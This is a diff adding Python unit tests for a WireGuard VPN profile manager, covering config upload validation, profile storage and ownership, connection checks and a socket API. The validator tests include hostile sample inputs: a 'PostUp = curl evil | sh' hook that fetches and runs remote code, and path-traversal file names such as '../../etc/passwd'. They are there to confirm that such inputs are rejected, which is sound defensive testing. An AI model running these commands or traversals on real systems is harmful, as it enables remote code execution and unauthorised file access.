@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-"""Tests for infra/compose/rakazo-vpn-manager.py with every host command mocked.
+"""Tests for infra/vpn-manager/rakazo-vpn-manager.py with every host command mocked.
 
-Run: python3 infra/compose/vpn-manager-test/test_vpn_manager.py
+Run: python3 infra/vpn-manager/test/test_vpn_manager.py
 """
 
 import http.client
@@ -13,6 +13,7 @@ import socket
 import subprocess
 import tempfile
 import threading
+import time
 import unittest
 from http.server import ThreadingHTTPServer
 from socketserver import ThreadingMixIn
@@ -759,6 +760,205 @@ global.setInterval=()=>0;
         r = subprocess.run(["node", "-e", harness], capture_output=True, text=True, timeout=30)
         self.assertEqual(r.returncode, 0, r.stderr)
         self.assertIn("ok", r.stdout)
+
+
+KEY_A = "a" * 43 + "="
+KEY_B = "b" * 43 + "="
+UPLOAD = (
+    "[Interface]\n# Key for my-laptop\nPrivateKey = " + KEY_A + "\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n\n"
+    "[Peer]\n# JP#412\nPublicKey = " + KEY_B + "\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = 203.0.113.9:51820\n"
+)
+
+
+class UploadValidationTests(unittest.TestCase):
+    def rejects(self, text, fragment):
+        with self.assertRaises(ValueError) as ctx:
+            mgr.validate_config(text)
+        self.assertIn(fragment, str(ctx.exception))
+
+    def test_accepts_a_provider_file_and_normalises_line_endings(self):
+        out = mgr.validate_config("\ufeff" + UPLOAD.replace("\n", "\r\n"))
+        self.assertNotIn("\r", out)
+        self.assertTrue(out.startswith("[Interface]"))
+
+    def test_rejects_what_cannot_work(self):
+        self.rejects("", "empty")
+        self.rejects("x" * (mgr.MAX_CONFIG_BYTES + 1), "too big")
+        self.rejects("\x00\x01binary", "not a WireGuard file")
+        self.rejects("just some text", "not a WireGuard file")
+        self.rejects(UPLOAD.replace("PrivateKey = " + KEY_A, "PrivateKey = short"), "private key")
+        self.rejects(UPLOAD.replace("Address = 10.2.0.2/32", "Address = fd00::2/128"), "IPv4")
+        self.rejects(UPLOAD.split("[Peer]")[0], "no server")
+        self.rejects(UPLOAD.replace("Endpoint = 203.0.113.9:51820\n", ""), "Endpoint")
+        self.rejects(UPLOAD.replace("0.0.0.0/0, ::/0", "10.0.0.0/8"), "AllowedIPs")
+        self.rejects(UPLOAD.replace("[Peer]", "[Wat]"), "unknown section")
+
+    def test_rejects_command_hooks(self):
+        for hook in ("PostUp", "preup", "PreDown", "POSTDOWN"):
+            self.rejects(UPLOAD.replace("DNS = 10.2.0.1", f"{hook} = curl evil | sh"), "runs commands")
+
+    def test_clean_name(self):
+        self.assertEqual(mgr.clean_name("C:\\Users\\me\\wg-JP-412.conf"), "wg-JP-412")
+        self.assertEqual(mgr.clean_name("../../etc/passwd"), "passwd")
+        self.assertEqual(mgr.clean_name("bad\nname\x07.conf"), "badname")
+        self.assertEqual(mgr.clean_name(None), "VPN")
+        self.assertEqual(len(mgr.clean_name("x" * 500)), 80)
+
+    def test_keepalive_added_only_where_missing(self):
+        out = mgr.with_keepalive("[Interface]\nPrivateKey = k\n[Peer]\nPublicKey = p\n[Peer]\nPublicKey = q\nPersistentKeepalive = 5")
+        self.assertEqual(out.count("PersistentKeepalive"), 2)
+        self.assertIn("PublicKey = p\nPersistentKeepalive = 25\n[Peer]", out)
+        self.assertNotIn("PrivateKey = k\nPersistentKeepalive", out)
+
+
+class UploadedProfileTests(Base):
+    def setUp(self):
+        super().setUp()
+        write_profiles(["wg-SG-155.conf"])
+        mgr.PROFILES = mgr.load_profiles()
+
+    def add(self, name="wg-JP-412.conf", owner="space1"):
+        return mgr.add_profile(UPLOAD, name, owner)
+
+    def test_add_writes_private_files_and_hides_internals(self):
+        pub = self.add()
+        self.assertRegex(pub["id"], mgr.UPLOAD_ID_RE)
+        self.assertLessEqual(len(pub["id"]), 15)  # wg-quick refuses longer file names
+        self.assertEqual((pub["name"], pub["owner"], pub["countryCode"], pub["serverLabel"]),
+                         ("wg-JP-412", "space1", "JP", "JP#412"))
+        for key in ("path", "table", "mark", "markHex", "addrV4"):
+            self.assertNotIn(key, pub)
+        conf = os.path.join(mgr.PROFILES_DIR, pub["id"] + ".conf")
+        self.assertEqual(os.stat(conf).st_mode & 0o777, 0o600)
+        self.assertEqual(os.stat(mgr.meta_path_for(conf)).st_mode & 0o777, 0o600)
+        self.assertIn(pub["id"], mgr.PROFILES)
+        self.assertTrue(any(a[:2] == ["wg", "setconf"] for a, _ in self.host.calls))
+
+    def test_new_profile_never_reuses_a_table_or_mark(self):
+        existing = mgr.PROFILES["wg-sg-155"]
+        pub = self.add()
+        new = mgr.PROFILES[pub["id"]]
+        self.assertNotEqual(new["table"], existing["table"])
+        self.assertNotEqual(new["mark"], existing["mark"])
+
+    def test_uploads_survive_a_restart_with_owner_and_name(self):
+        pub = self.add()
+        reloaded = mgr.load_profiles()
+        self.assertEqual(reloaded[pub["id"]]["owner"], "space1")
+        self.assertEqual(reloaded[pub["id"]]["name"], "wg-JP-412")
+        self.assertIsNone(reloaded["wg-sg-155"]["owner"])
+
+    def test_failed_tunnel_leaves_nothing_behind(self):
+        with mock.patch.object(mgr, "ensure_tunnel_up", side_effect=RuntimeError("no wireguard")):
+            with self.assertRaises(RuntimeError):
+                self.add()
+        self.assertEqual(sorted(os.listdir(mgr.PROFILES_DIR)), ["wg-SG-155.conf"])
+        self.assertEqual(list(mgr.PROFILES), ["wg-sg-155"])
+
+    def test_add_requires_an_owner(self):
+        with self.assertRaises(ValueError):
+            mgr.add_profile(UPLOAD, "x.conf", None)
+
+    def test_remove_checks_owner_shared_and_use(self):
+        pid = self.add()["id"]
+        with self.assertRaises(ValueError):
+            mgr.remove_profile(pid, "space2")
+        with self.assertRaises(ValueError):
+            mgr.remove_profile("wg-sg-155", "space1")
+        mgr.STATE["bridges"][BR_A] = {"profile": pid, "locked": False}
+        with self.assertRaises(mgr.ProfileInUse):
+            mgr.remove_profile(pid, "space1")
+        mgr.STATE["bridges"].clear()
+        iface = mgr.PROFILES[pid]["iface"]
+        mgr.remove_profile(pid, "space1")
+        self.assertNotIn(pid, mgr.PROFILES)
+        self.assertEqual(sorted(os.listdir(mgr.PROFILES_DIR)), ["wg-SG-155.conf"])
+        self.assertIn(["ip", "link", "del", iface], [a for a, _ in self.host.calls])
+
+
+class ConnectionTestTests(Base):
+    def setUp(self):
+        super().setUp()
+        write_profiles([])
+        mgr.PROFILES = {}
+        self.pid = mgr.add_profile(UPLOAD.replace("# JP#412\n", ""), "office.conf", "space1")["id"]
+        mgr.HOST_IP_CACHE.update(ip="198.51.100.1", country="TH", at=time.time())
+
+    def run_test(self, curl, handshake=None):
+        real = self.host
+
+        def fake(args, timeout=12, input_text=None):
+            if args[0] == "curl":
+                return curl
+            if args[:4] == ["wg", "show", "all", "dump"]:
+                iface = mgr.PROFILES[self.pid]["iface"]
+                hs = str(int(time.time()) - 5) if handshake else "0"
+                return 0, f"{iface}\tpub\t(none)\t203.0.113.9:51820\t0.0.0.0/0\t{hs}\t1\t1\t25", ""
+            return real(args, timeout, input_text)
+
+        with mock.patch.object(mgr, "sh", fake):
+            return mgr.test_profile(self.pid)
+
+    def test_connected_learns_an_unknown_country(self):
+        self.assertEqual(mgr.PROFILES[self.pid]["countryCode"], "UN")
+        r = self.run_test((0, "ip=203.0.113.50\nloc=JP\n", ""), handshake=True)
+        self.assertEqual((r["result"], r["exitIp"], r["exitCountry"]), ("connected", "203.0.113.50", "JP"))
+        self.assertEqual(mgr.PROFILES[self.pid]["countryCode"], "JP")
+        self.assertEqual(mgr.load_profiles()[self.pid]["countryCode"], "JP")
+
+    def test_failure_kinds(self):
+        self.assertEqual(self.run_test((28, "", "timeout"))["result"], "no_handshake")
+        self.assertEqual(self.run_test((28, "", "timeout"), handshake=True)["result"], "no_internet")
+        r = self.run_test((0, "ip=198.51.100.1\nloc=TH\n", ""), handshake=True)
+        self.assertEqual((r["result"], r["exitIp"]), ("not_private", None))
+
+    def test_curl_is_bound_to_the_tunnel(self):
+        calls = []
+        real = self.host
+
+        def fake(args, timeout=12, input_text=None):
+            calls.append(args)
+            return (0, "ip=203.0.113.50\nloc=JP\n", "") if args[0] == "curl" else real(args, timeout, input_text)
+
+        with mock.patch.object(mgr, "sh", fake):
+            mgr.test_profile(self.pid)
+        curl = next(a for a in calls if a[0] == "curl")
+        self.assertEqual(curl[curl.index("--interface") + 1], mgr.PROFILES[self.pid]["iface"])
+
+    def test_unknown_profile(self):
+        with self.assertRaises(ValueError):
+            mgr.test_profile("vpn-000000000000")
+
+
+class ProfileApiTests(HandlerBase):
+    def setUp(self):
+        super().setUp()
+        write_profiles([])
+        mgr.PROFILES = {}
+        self.sock = os.path.join(TMP, "p.sock")
+        if os.path.exists(self.sock):
+            os.unlink(self.sock)
+        self.serve(mgr.ThreadingUnixStreamServer(self.sock, mgr.ApiHandler))
+        self.c = Http(self.sock)
+
+    def test_upload_remove_round_trip(self):
+        status, body = self.c.request("POST", "/profiles", body={"config": UPLOAD, "name": "a.conf", "owner": "s1"})
+        self.assertEqual(status, 201)
+        status, snap = self.c.request("GET", "/status")
+        self.assertEqual([(p["id"], p["owner"]) for p in snap["profiles"]], [(body["id"], "s1")])
+        self.assertEqual(self.c.request("DELETE", f"/profiles/{body['id']}", body={"owner": "s1"})[0], 200)
+        self.assertEqual(self.c.request("GET", "/status")[1]["profiles"], [])
+
+    def test_errors(self):
+        status, body = self.c.request("POST", "/profiles", body={"config": "nope", "name": "a", "owner": "s1"})
+        self.assertEqual(status, 400)
+        self.assertIn("WireGuard", body["error"])
+        pid = self.c.request("POST", "/profiles", body={"config": UPLOAD, "name": "a", "owner": "s1"})[1]["id"]
+        mgr.STATE["bridges"][BR_A] = {"profile": pid, "locked": True}
+        self.assertEqual(self.c.request("DELETE", f"/profiles/{pid}", body={"owner": "s1"})[0], 409)
+        self.assertEqual(self.c.request("POST", "/profiles/vpn-000000000000/test")[0], 400)
+        self.assertEqual(self.c.request("DELETE", "/profiles/a%2F..", body={"owner": "s1"})[0], 404)
+
 
 
 def tearDownModule():
